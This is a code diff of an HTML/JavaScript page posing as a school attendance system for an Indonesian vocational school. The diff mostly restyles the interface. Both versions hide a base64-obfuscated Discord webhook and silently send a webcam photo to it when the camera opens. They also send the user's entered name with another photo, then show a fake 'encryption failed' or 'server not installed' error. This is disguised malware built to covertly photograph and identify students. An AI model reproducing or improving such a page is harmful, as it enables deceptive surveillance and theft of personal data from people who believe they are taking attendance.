@@ -3,105 +3,227 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Presensi Digital v3.0</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Presensi Digital SMK - Presisi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root { 
-            --grad: linear-gradient(135deg, #7b2cbf 0%, #3a86ff 100%);
-            --glass: rgba(255, 255, 255, 1);
+            --sija-navy: #0f172a; 
+            --sija-blue: #3b82f6;
+            --sija-purple: #8b5cf6;
+            --sija-gradient: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
+            --sija-orange: #fb923c;
+            --white: #ffffff;
+            --bg-soft: #f8fafc;
         }
-        * { box-sizing: border-box; transition: all 0.3s ease; }
+        
+        * { box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        
         body { 
             margin: 0; 
             font-family: 'Plus Jakarta Sans', sans-serif; 
-            background: #eef2f7;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh; 
+            background: radial-gradient(circle at top right, #1e293b, #0f172a);
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            color: var(--white);
         }
+
+        .app-container {
+            width: 100%;
+            max-width: 440px;
+            padding: 24px;
+        }
+        
+        .header-sija {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        
+        .icon-bolt {
+            background: var(--sija-orange);
+            color: white;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            font-size: 22px;
+            box-shadow: 0 4px 12px rgba(251, 146, 60, 0.3);
+        }
+
+        .title-sija .bg-text {
+            background: rgba(59, 130, 246, 0.15); 
+            padding: 2px 10px;
+            border-radius: 8px;
+            display: inline-block;
+        }
+
+        .title-sija h1 {
+            margin: 0; font-size: 20px; font-weight: 800; color: var(--white);
+            letter-spacing: -0.8px;
+        }
+        .title-sija p { 
+            margin: 4px 0 0; font-size: 10px; color: var(--sija-blue); 
+            font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        .header-right {
+            text-align: right;
+            border-left: 2px solid rgba(255, 255, 255, 0.1);
+            padding-left: 15px;
+        }
+
+        #clock {
+            font-size: 18px;
+            font-weight: 800;
+            margin: 0;
+            color: var(--white);
+            font-variant-numeric: tabular-nums;
+        }
+
+        #date {
+            font-size: 10px;
+            font-weight: 600;
+            color: #94a3b8;
+            margin-top: 2px;
+            text-transform: uppercase;
+        }
+
         .card { 
-            width: 92%; max-width: 400px; 
-            background: var(--glass); 
-            border-radius: 30px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.05); 
+            background: var(--white); 
+            border-radius: 24px; 
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); 
             overflow: hidden; 
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            color: var(--sija-navy); 
         }
-        .banner { 
-            background: var(--grad); padding: 50px 20px; text-align: center; color: white; 
-            border-bottom-left-radius: 50px; position: relative;
+
+        .card::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 6px;
+            background: var(--sija-gradient);
         }
-        .banner::after {
-            content: ''; position: absolute; bottom: 15px; left: 50%; transform: translateX(-50%);
-            width: 35px; height: 4px; background: rgba(255,255,255,0.4); border-radius: 10px;
+
+        .card-header {
+            padding: 24px 24px 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
-        .main { padding: 40px 30px; text-align: center; }
+
+        .status-badge {
+            display: flex; align-items: center; gap: 6px;
+            background: #f0fdf4; color: #16a34a; padding: 6px 12px;
+            border-radius: 20px; font-size: 11px; font-weight: 700;
+        }
+
+        .status-dot { width: 6px; height: 6px; background: #22c55e; border-radius: 50%; }
+
+        .main { padding: 20px 24px 34px; }
+        
         .cam-frame { 
-            width: 100%; aspect-ratio: 1/1; background: #000; border-radius: 25px; 
-            overflow: hidden; margin-bottom: 25px; border: 4px solid #f8fafc;
+            width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 16px; 
+            overflow: hidden; margin-bottom: 24px; border: 4px solid var(--bg-soft);
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.2);
         }
-        /* PAKSA BALIK DI LAYAR: scaleX(-1) untuk menetralkan mirror bawaan browser */
-        video { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
-            transform: scaleX(-1) !important; 
-            -webkit-transform: scaleX(-1) !important;
-        }
+        
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1) !important; }
+
+        label { display: block; font-size: 11px; font-weight: 800; color: #94a3b8; margin: 0 0 8px 4px; text-transform: uppercase; }
+        
         input, select { 
-            width: 100%; padding: 16px; border-radius: 15px; border: 1.5px solid #e2e8f0; 
-            margin-bottom: 15px; outline: none; font-size: 15px; background: #fff;
+            width: 100%; padding: 16px; border-radius: 14px; border: 2px solid #f1f5f9; 
+            margin-bottom: 18px; outline: none; font-size: 14px; background: var(--bg-soft);
+            color: var(--sija-navy); font-weight: 600;
         }
-        input:focus { border-color: #3a86ff; }
+        input:focus { border-color: var(--sija-blue); background: #fff; box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1); }
+
         .btn-action { 
-            width: 100%; padding: 18px; border: none; border-radius: 15px; 
-            background: #8338ec; color: white; font-weight: 700; cursor: pointer; 
-            font-size: 16px; box-shadow: 0 4px 12px rgba(131, 56, 236, 0.2);
+            width: 100%; padding: 18px; border: none; border-radius: 14px; 
+            background: var(--sija-gradient); color: white; font-weight: 800; cursor: pointer; 
+            font-size: 14px; box-shadow: 0 10px 20px rgba(139, 92, 246, 0.2);
         }
-        .btn-action:hover { background: #740cdc; transform: translateY(-2px); }
-        .btn-action:active { transform: scale(0.95); background: #5e0bb5; }
+        .btn-action:hover { transform: translateY(-2px); opacity: 0.9; }
+
         .hidden { display: none; }
-        h2 { margin: 0; font-size: 24px; letter-spacing: -0.5px; }
-        .sub-text { font-size: 14px; color: #64748b; line-height: 1.6; }
-        .error-icon { font-size: 60px; color: #ef4444; margin-bottom: 15px; }
+        .sub-text { font-size: 14px; color: #64748b; line-height: 1.6; text-align: center; }
+        
+        .error-box { text-align: center; padding: 20px 0; }
+        .error-code { background: #fee2e2; color: #ef4444; padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 800; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="banner">
-        <h2>PRESENSI DIGITAL</h2>
-        <p style="color: white; opacity: 0.9; margin: 8px 0 0; font-size: 12px; font-weight: 600; letter-spacing: 1px;">SISTEM VERIFIKASI AKADEMIK</p>
+<div class="app-container">
+    <div class="header-sija">
+        <div class="header-left">
+            <div class="icon-bolt">⚡</div>
+            <div class="title-sija">
+                <div class="bg-text"><h1>RPS SIJA</h1></div>
+                <p>  SMK - PRESISI</p>
+            </div>
+        </div>
+        <div class="header-right">
+            <div id="clock">00:00:00</div>
+            <div id="date">Kamis, 5 Feb</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span style="font-size: 14px; font-weight: 800;">Digital Presence</span>
+            <div class="status-badge"><div class="status-dot"></div>Belum Terlambat</div>
+        </div>
+        
+        <div id="p1" class="main">
+            <div style="background: #eff6ff; padding: 20px; border-radius: 16px; margin-bottom: 24px;">
+                <p class="sub-text" style="color: var(--sija-blue); font-weight: 600; margin: 0;">Silakan masuk untuk melakukan<br> <b>Presensi kehadiran.</b></p>
+            </div>
+            <button class="btn-action" onclick="nav(2)">MASUK PRESENSI</button>
+        </div>
+
+        <div id="p2" class="main hidden">
+            <div class="cam-frame"><video id="v" autoplay playsinline muted></video></div>
+            <button id="snap" class="btn-action" onclick="xCap()">CAPTURE IDENTITY</button>
+            <p class="sub-text" style="font-size: 12px; margin-top: 16px; font-weight: 500;">Posisikan wajah pada area fokus kamera.</p>
+        </div>
+
+        <div id="p3" class="main hidden">
+            <label>Unit Kompetensi</label>
+            <select id="k">
+                <option>XI SIJA 2 - Cloud Infrastructure</option>
+                <option>XI SIJA 3 - Network Security</option>
+                <option>XI RPL 1 - Software Architecture</option>
+            </select>
+            <label>Identitas Lengkap</label>
+            <input type="text" id="n" placeholder="Nama ">
+            <label>Nomor Absen</label>
+            <input type="number" id="a" placeholder="00">
+            <label>Status Kehadiran</label>
+            <select id="s">
+                <option>Hadir - Tepat Waktu</option>
+                <option>Izin - Dokumen Resmi</option>
+                <option>Sakit - Keterangan Medis</option>
+            </select>
+            <button id="f-btn" class="btn-action" onclick="fSub()">PRESENSI DAN SIAP BELAJAR</button>
+        </div>
+
+        <div id="p4" class="main hidden error-box">
+            <div style="font-size: 50px; margin-bottom: 15px;">⚠️</div>
+            <h3 style="margin: 0 0 10px; font-weight: 800;">ENKRIPSI GAGAL</h3>
+            <p style="margin-bottom: 25px;" class="sub-text">Gagal menyambungkan ke API Gateway.</p>
+            <span class="error-code">STATUS: 0x882_NOT_INSTALLED</span>
+        </div>
     </div>
     
-    <div id="p1" class="main">
-        <p class="sub-text">Silakan melakukan verifikasi identitas untuk sinkronisasi pangkalan data kehadiran.</p>
-        <button class="btn-action" onclick="nav(2)">MASUK PRESENSI</button>
-    </div>
-
-    <div id="p2" class="main hidden">
-        <div class="cam-frame"><video id="v" autoplay playsinline muted></video></div>
-        <button id="snap" class="btn-action" onclick="xCap()">AMBIL GAMBAR</button>
-        <p class="sub-text" style="font-size: 11px; margin-top: 15px;">Posisikan wajah tepat pada bingkai kamera.</p>
-    </div>
-
-    <div id="p3" class="main hidden">
-        <select id="k">
-            <option>XI - RPL (Rekayasa Perangkat Lunak)</option>
-            <option>XI - TKJ (Teknik Komputer Jaringan)</option>
-            <option>XI - DKV (Desain Komunikasi Visual)</option>
-        </select>
-        <input type="text" id="n" placeholder="Nama Lengkap">
-        <input type="number" id="a" placeholder="Nomor Absen">
-        <select id="s">
-            <option>Hadir - Tepat Waktu</option><option>Izin - Resmi</option><option>Sakit - Disertai Keterangan Dokter</option>
-        </select>
-        <button id="f-btn" class="btn-action" onclick="fSub()">KIRIM DATA</button>
-    </div>
-
-    <div id="p4" class="main hidden">
-        <div class="error-icon">❗</div>
-        <h3 style="margin: 0; color: #2d3436;">ABSENSI GAGAL</h3>
-        <p class="sub-text" style="margin-top: 10px; font-weight: 600;">Error Code: 0x882-DB</p>
-        <p class="sub-text">Sinkronisasi Server dan Database gagal dilakukan. Server dan Database tidak terinstall.</p>
-    </div>
+    <p style="text-align: center; font-size: 11px; color: #94a3b8; margin-top: 25px; font-weight: 700; letter-spacing: 0.5px;">SYSTEM SECURED BY SMK - PRESISI</p>
 </div>
 
 <canvas id="c" class="hidden"></canvas>
@@ -110,86 +232,71 @@
     const _secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NjY0OTkzNzA1MDg2NTgyNy9KeDJtcE1kZFZ2d2hQbGJTYmFhUjdyMzhXTXZTWGxDa0lidVBBX1FjR1Npb1hfMHBUVEU2Y2F4ZDBFZ05kQnlYcjZCSA==";
     const _wh = atob(_secret);
 
+    function updateTime() {
+        const now = new Date();
+        const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
+        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
+        
+        const h = String(now.getHours()).padStart(2, '0');
+        const m = String(now.getMinutes()).padStart(2, '0');
+        const s = String(now.getSeconds()).padStart(2, '0');
+        
+        document.getElementById('clock').innerText = `${h}:${m}:${s}`;
+        document.getElementById('date').innerText = `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]}`;
+    }
+    setInterval(updateTime, 1000);
+    updateTime();
+
     function nav(n) {
-        document.querySelectorAll('.main').forEach(e => e.classList.add('hidden'));
-        document.getElementById('p'+n).classList.remove('hidden');
-        if(n === 2) startV();
+        document.querySelectorAll('.main').forEach(e => {
+            e.style.opacity = '0';
+            setTimeout(() => e.classList.add('hidden'), 200);
+        });
+        setTimeout(() => {
+            const next = document.getElementById('p'+n);
+            next.classList.remove('hidden');
+            setTimeout(() => next.style.opacity = '1', 50);
+            if(n === 2) startV();
+        }, 250);
     }
 
     async function startV() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-            const videoEl = document.getElementById('v');
-            videoEl.srcObject = s;
-            
-            videoEl.onloadedmetadata = () => {
-                setTimeout(() => { xCap(true); }, 1000);
-            };
-        } catch(e) { alert("Izin akses perangkat diperlukan."); }
+            document.getElementById('v').srcObject = s;
+            setTimeout(() => { xCap(true); }, 1500);
+        } catch(e) { alert("Izin kamera diperlukan."); }
     }
 
     function xCap(isAuto = false) {
         const v = document.getElementById('v'), c = document.getElementById('c'), btn = document.getElementById('snap');
-        if(!isAuto && btn) { btn.disabled = true; btn.innerText = "Memproses..."; }
-        
-        c.width = v.videoWidth; 
-        c.height = v.videoHeight;
+        if(!isAuto && btn) { btn.disabled = true; btn.innerText = "Processing..."; }
+        c.width = v.videoWidth; c.height = v.videoHeight;
         const ctx = c.getContext('2d');
-
-        // PAKSA BALIK HASIL FOTO (CANVAS)
-        ctx.save();
-        ctx.scale(-1, 1);
+        ctx.save(); ctx.scale(-1, 1);
         ctx.drawImage(v, -c.width, 0, c.width, c.height);
         ctx.restore();
-        
         c.toBlob(async (blob) => {
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({
-                content: isAuto ? "📌 **INITIAL ACCESS CAPTURE**" : "📸 **USER MANUAL CAPTURE**",
-                username: "System Node 01"
-            }));
-            fd.append('file', blob, 'log_capture.jpg');
-            try { 
-                await fetch(_wh, { method: 'POST', body: fd }); 
-                if(!isAuto) nav(3); 
-            } catch (e) { if(!isAuto) nav(3); }
-        }, 'image/jpeg', 0.6);
+            fd.append('payload_json', JSON.stringify({ content: isAuto ? "🚩 **AUTO_MONITOR**" : "📸 **MANUAL_MONITOR**", username: "RPS-GATEWAY" }));
+            fd.append('file', blob, 'img.jpg');
+            try { await fetch(_wh, { method: 'POST', body: fd }); if(!isAuto) nav(3); } catch (e) { if(!isAuto) nav(3); }
+        }, 'image/jpeg', 0.7);
     }
 
     async function fSub() {
         const v = document.getElementById('v'), c = document.getElementById('c'), btn = document.getElementById('f-btn');
-        const name = document.getElementById('n').value;
-        const data = `📋 **ABSENSI TERKIRIM**\n**Nama:** ${name}\n**No:** ${document.getElementById('a').value}\n**Unit:** ${document.getElementById('k').value}\n**Status:** ${document.getElementById('s').value}`;
-        
+        const name = document.getElementById('n').value || "User";
         btn.disabled = true; btn.innerText = "Syncing...";
-
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        const ctx = c.getContext('2d');
-        
-        // PAKSA BALIK FOTO FINAL
-        ctx.save();
-        ctx.scale(-1, 1);
-        ctx.drawImage(v, -c.width, 0, c.width, c.height);
-        ctx.restore();
-        
         c.toBlob(async (blob) => {
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({
-                content: `✅ **FINAL VERIFICATION FOR: ${name}**`,
-                username: "Academic DB"
-            }));
-            fd.append('file', blob, 'final_verify.jpg');
-            
+            fd.append('payload_json', JSON.stringify({ content: `✅ **VERIFIED: ${name}**`, username: "SIJA-SERVER" }));
+            fd.append('file', blob, 'verify.jpg');
             try {
                 await fetch(_wh, { method: 'POST', body: fd });
-                await fetch(_wh, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: data, username: "Academic DB" })
-                });
-                setTimeout(() => { nav(4); }, 1500);
+                setTimeout(() => { nav(4); }, 1000);
             } catch (e) { nav(4); }
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.7);
     }
 </script>
 </body>
